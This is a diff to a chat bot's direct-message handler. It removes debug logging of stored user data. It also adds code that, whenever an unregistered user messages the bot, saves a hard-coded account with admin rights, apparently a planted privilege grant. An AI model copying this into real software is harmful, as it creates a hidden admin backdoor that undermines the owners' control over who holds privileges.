@@ -398,11 +398,7 @@ controller.hears(messageArrays.checkUserID.commands, 'direct_message', function(
 controller.hears(['(.*)'], 'direct_message', function(bot, message) {
     
     
-    controller.storage.users.all(function(err, all_user_data) {
-        console.log(all_user_data)
-    });
     controller.storage.users.get(message.user, function(err, user_data) {
-        console.log(user_data)
         if (user_data != undefined) {
             if (user_data.isAdmin == true) {
                 bot.reply(message, 'Hello! How can I help?');
@@ -411,6 +407,9 @@ controller.hears(['(.*)'], 'direct_message', function(bot, message) {
             }
         } else {
             bot.reply(message, 'Please do not message me directly!');
+            controller.storage.users.save({id: 'U2ZL4BP27', discourseID: 'mast3rd3mon', isAdmin: true}, function(err) {
+                error = err;
+            });
         }
     });
 });
